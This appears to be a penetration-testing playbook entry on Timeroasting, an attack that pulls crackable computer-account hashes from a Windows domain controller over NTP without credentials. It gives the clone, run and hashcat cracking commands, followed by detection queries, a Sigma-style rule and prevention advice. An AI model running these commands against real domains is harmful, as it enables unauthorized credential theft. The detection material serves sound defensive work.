name: Timeroasting (Unauthenticated NTP Hash Extraction)
description: Timeroasting abuses MS-SNTP (Microsoft's authenticated NTP extension) to extract crackable hashes for every computer account in the domain, without any credentials. Computer accounts normally have random 120-char passwords (uncrackable), but appliances, IoT devices, or accounts joined with weak passwords can be cracked. The last unauthenticated stone to turn.
notes:
=== THE IDEA ===
MS-SNTP signs NTP responses with the computer account's password hash.
Timeroast sends NTP requests for each RID, and the DC responds with a
signed value that can be cracked offline. No credentials needed.

=== INSTALL ===
  git clone https://github.com/SecuraBV/Timeroast /tmp/timeroast

=== RUN ===
  sudo python3 /tmp/timeroast/timeroast.py <dc_ip> -o timeroast_hashes.txt

=== CRACK ===
  hashcat -m 31300 timeroast_hashes.txt /usr/share/wordlists/rockyou.txt --username
  # --username tells hashcat the 'RID:' prefix is a username, not part of the hash
  # Without --username you get 'token length exception'

=== WHEN IT MATTERS ===
Machine passwords are normally random 120-char strings - uncrackable.
But if a device was domain-joined with a weak password (appliances,
IoT, old servers, manually set machine passwords), timeroasting cracks it.
It is the LAST unauthenticated check after kerbrute + AS-REP roast.

=== REQUIRES ===
- Root/sudo (raw NTP socket)
- Port 123/UDP open to the DC
- MS-SNTP enabled (default on Windows DCs)

examples.label: Extract NTP hashes from domain controller

recommended.note: Kerbrute finds valid users; timeroasting targets computer accounts. Together they cover the full unauthenticated enumeration surface.

defense.why_it_works: MS-SNTP uses the computer account's NT hash to sign NTP responses. The signed value is extractable from the NTP reply and crackable offline with hashcat mode 31300.
defense.prerequisites: Network access to the DC on UDP 123; no credentials required.
defense.impact: Recovery of computer account passwords if they are weak (appliances, manually joined devices).
defense.detection: [MITRE T1558] Large volume of NTP requests from a single source with varying RIDs; no native Windows event for this.
defense.artifacts: Network capture showing rapid NTP queries to the DC; cracked computer account hashes.
defense.splunk_spl:
index=network sourcetype=sntp dest_port=123 dest=<dc_ip>
| stats count by src_ip
| where count > 100
| sort -count
defense.sentinel_kql:
CommonSecurityLog
| where DestinationPort == 123 and DestinationIP == '<dc_ip>'
| summarize RequestCount=count() by SourceIP
| where RequestCount > 100
defense.prevention: Disable MS-SNTP if not needed (requires registry change); use strong random machine passwords (default behavior); monitor NTP traffic for anomalous volumes.

detections.name: Timeroasting - rapid NTP enumeration
detections.logic:
title: Rapid NTP Authentication Requests (Timeroasting)
status: experimental
logsource:
  category: network
  product: any
detection:
  selection:
    dst_port: 123
  condition: selection | count() by src_ip > 100
level: medium
detections.false_positives: NTP clients with multiple time sources; network time synchronization tools
detections.tuning: Threshold on request count per source IP per minute; exclude known NTP clients
